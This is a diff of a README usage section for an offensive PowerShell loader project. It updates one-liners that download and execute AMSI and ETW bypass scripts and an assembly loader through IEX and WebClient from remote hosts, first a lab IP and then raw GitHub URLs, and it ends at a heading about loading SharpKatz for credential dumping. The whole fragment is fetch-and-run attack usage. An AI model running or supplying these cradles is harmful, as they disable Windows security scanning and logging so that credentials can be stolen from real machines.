@@ -12,14 +12,16 @@ https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
 ### Usage:
 
 ```
-## AMSI bypass all-in-one, sometimes amsi3.txt been detected and blocked
-IEX([Net.Webclient]::new().DownloadString("http://10.0.0.189/osep/amsi3.txt"));
-IEX([Net.Webclient]::new().DownloadString("http://10.0.0.189/osep/Invoke-LoadAssembly.ps1"));
+## ETW bypass and AMSI bypass all-in-one, sometimes amsi3.txt been detected and blocked
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/etw.txt"));
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));
 
 ## If amsi3.txt has been blocked, then try the following AMSI bypass 
-IEX([Net.Webclient]::new().DownloadString("http://10.0.0.189/osep/amsi.txt"));
-IEX([Net.Webclient]::new().DownloadString("http://10.0.0.189/osep/amsi2.txt"));
-IEX([Net.Webclient]::new().DownloadString("http://10.0.0.189/osep/Invoke-LoadAssembly.ps1"));
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi.txt"));
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi2.txt"));
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/etw.txt"));
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));
 
 
 ## Load SharpKatz
